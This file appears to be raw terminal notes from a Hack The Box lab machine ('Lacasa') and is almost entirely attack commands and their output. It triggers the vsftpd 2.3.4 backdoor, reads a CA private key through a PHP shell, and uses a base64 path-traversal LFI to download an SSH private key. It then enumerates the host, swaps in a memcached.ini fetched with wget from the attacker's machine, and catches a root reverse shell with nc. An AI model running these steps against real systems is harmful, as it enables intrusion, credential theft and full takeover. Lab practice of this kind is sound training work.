@@ -1,0 +1,259 @@
+Command Exec in vsftp 2.3.4
+root@kali:~# python3 exploit.py 10.10.10.131 21 whoami
+[*] Attempting to trigger backdoor...
+[+] Triggered backdoor
+[*] Attempting to connect to backdoor...
+[+] Connected to backdoor on 10.10.10.131:6200
+[+] Response:
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+
+
+Download ca key from psy shell
+root@kali:~/HTB/Lacasa# nc 10.10.10.131 6200
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+ls
+Variables: $tokyo
+show $tokyo
+  > 2| class Tokyo {
+    3| 	private function sign($caCert,$userCsr) {
+    4| 		$caKey = file_get_contents('/home/nairobi/ca.key');
+    5| 		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
+    6| 		openssl_x509_export($userCert, $userCertOut);
+    7| 		return $userCertOut;
+    8| 	}
+    9| }
+
+
+chdir('/home/nairobi/')
+=> true
+file_get_contents('ca.key')   
+
+
+
+
+root@kali:~/HTB/Lacasa# openssl pkcs12 -export -in lacasadepapelhtb.crt -inkey ca.key -out server.p12
+Enter Export Password:
+Verifying - Enter Export Password:
+
+
+Install server.p12 on firefox and goto port 443
+
+https://lacasadepapel.htb/?path=SEASON-1
+https://lacasadepapel.htb/?path=SEASON-2
+https://lacasadepapel.htb/file/<base64encodedpath>
+
+LFI
+>>> base64.b64encode(b"SEASON-1/../../.ssh/id_rsa")
+'U0VBU09OLTEvLi4vLi4vLnNzaC9pZF9yc2E='
+https://10.10.10.131/file/U0VBU09OLTEvLi4vLi4vLnNzaC9pZF9yc2E=
+>>> base64.b64encode(b"SEASON-1/../../.ssh/id_rsa.pub")
+'U0VBU09OLTEvLi4vLi4vLnNzaC9pZF9yc2EucHVi'
+https://10.10.10.131/file/U0VBU09OLTEvLi4vLi4vLnNzaC9pZF9yc2EucHVi
+downloaded id_rsa key
+>>> base64.b64encode(b"SEASON-1/../../user.txt")
+'U0VBU09OLTEvLi4vLi4vdXNlci50eHQ='
+https://10.10.10.131/file/U0VBU09OLTEvLi4vLi4vdXNlci50eHQ=
+get user.txt
+
+root@kali:~/HTB/Lacasa# ssh -i id_rsa professor@lacasadepapel.htb
+
+ _             ____                  ____         ____                  _ 
+| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
+| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
+| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
+|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
+                                                            |_|       
+
+lacasadepapel [~]$ pwd
+/home/professor
+lacasadepapel [~]$ uname -a
+Linux lacasadepapel 4.14.78-0-virt #1-Alpine SMP Tue Oct 23 11:43:38 UTC 2018 x86_64 Linux
+lacasadepapel [~]$ env
+MAIL=/var/mail/professor
+USER=professor
+SSH_CLIENT=10.10.16.57 57730 22
+SHLVL=1
+HOME=/home/professor
+SSH_TTY=/dev/pts/1
+PAGER=less
+PS1=\[\e[1;32m\]\h [\[\e[0m\]\w\[\e[1;32m\]]$ \[\e[0m\]
+LOGNAME=professor
+TERM=xterm-256color
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+SHELL=/bin/ash
+PWD=/home/professor
+SSH_CONNECTION=10.10.16.57 57730 10.10.10.131 22
+CHARSET=UTF-8
+lacasadepapel [~]$ grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+root
+lacasadepapel [~]$ netstat -antup
+netstat: can't scan /proc - are you root?
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      -
+lacasadepapel [~]$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/sudo
+/usr/bin/abuild-sudo
+/bin/bbsuid
+
+
+SSH Tunnel port 11211(memcache) to our box
+root@kali:~/HTB/Lacasa# ssh -nNT -L 11211:127.0.0.1:11211 -i id_rsa professor@lacasadepapel.htb
+
+root@kali:~/HTB/Lacasa# telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+stats
+STAT pid 3188
+STAT uptime 3427
+STAT time 1563035160
+STAT version 1.5.8
+STAT libevent 2.1.8-stable
+STAT pointer_size 64
+STAT rusage_user 1.046305
+STAT rusage_system 0.448292
+STAT max_connections 1024
+STAT curr_connections 5
+STAT total_connections 89
+STAT rejected_connections 0
+STAT connection_structures 8
+STAT reserved_fds 20
+STAT cmd_get 19
+STAT cmd_set 0
+STAT cmd_flush 0
+STAT cmd_touch 0
+STAT get_hits 0
+STAT get_misses 19
+STAT get_expired 0
+STAT get_flushed 0
+STAT delete_misses 0
+STAT delete_hits 0
+STAT incr_misses 0
+STAT incr_hits 0
+STAT decr_misses 0
+STAT decr_hits 0
+STAT cas_misses 0
+STAT cas_hits 0
+STAT cas_badval 0
+STAT touch_hits 0
+STAT touch_misses 0
+STAT auth_cmds 0
+STAT auth_errors 0
+STAT bytes_read 20384
+STAT bytes_written 2704351
+STAT limit_maxbytes 67108864
+STAT accepting_conns 1
+STAT listen_disabled_num 0
+STAT time_in_listen_disabled_us 0
+STAT threads 4
+STAT conn_yields 0
+STAT hash_power_level 16
+STAT hash_bytes 524288
+STAT hash_is_expanding 0
+STAT slab_reassign_rescues 0
+STAT slab_reassign_chunk_rescues 0
+STAT slab_reassign_evictions_nomem 0
+STAT slab_reassign_inline_reclaim 0
+STAT slab_reassign_busy_items 0
+STAT slab_reassign_busy_deletes 0
+STAT slab_reassign_running 0
+STAT slabs_moved 0
+STAT lru_crawler_running 0
+STAT lru_crawler_starts 2805
+STAT lru_maintainer_juggles 2845
+STAT malloc_fails 0
+STAT log_worker_dropped 0
+STAT log_worker_written 0
+STAT log_watcher_skipped 0
+STAT log_watcher_sent 0
+STAT bytes 0
+STAT curr_items 0
+STAT total_items 0
+STAT slab_global_page_pool 0
+STAT expired_unfetched 0
+STAT evicted_unfetched 0
+STAT evicted_active 0
+STAT evictions 0
+STAT reclaimed 0
+STAT crawler_reclaimed 0
+STAT crawler_items_checked 0
+STAT lrutail_reflocked 0
+STAT moves_to_cold 0
+STAT moves_to_warm 0
+STAT moves_within_lru 0
+STAT direct_reclaims 0
+STAT lru_bumps_dropped 0
+END
+
+stats slabs
+STAT active_slabs 0
+STAT total_malloced 0
+
+stats items
+END
+
+
+5 auxiliary(gather/memcached_extractor) > run
+
+[+] 127.0.0.1:11211       - Found 0 keys
+[*] 127.0.0.1:11211       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+Replace the memcached.ini file
+lacasadepapel [~]$ rm memcached.ini
+rm: remove 'memcached.ini'? y
+lacasadepapel [~]$ wget http://10.10.16.57:8000/memcached.ini .
+Connecting to 10.10.16.57:8000 (10.10.16.57:8000)
+memcached.ini        100% |***********************************************************************************|    92  0:00:00 ETA
+wget: bad address '.'
+lacasadepapel [~]$ ls -a
+.              ..             .ash_history   .ssh           memcached.ini  memcached.js   node_modules   pspy
+lacasadepapel [~]$ 
+
+root@kali:~/HTB/Lacasa# nc -lvp 1337
+listening on [any] 1337 ...
+connect to [10.10.16.57] from lacasadepapel.htb [10.10.10.131] 54700
+bash: cannot set terminal process group (3626): Not a tty
+bash: no job control in this shell
+bash-4.4# whoami
+whoami
+root
+bash-4.4# ls -a
+ls -a
+.
+..
+.DS_Store
+._.DS_Store
+bin
+boot
+dev
+etc
+home
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+swap
+sys
+tmp
+usr
+var
+bash-4.4# cat /root/root.txt
+cat /root/root.txt
+586979c48efbef5909a23750cc07f511
+bash-4.4# 
+
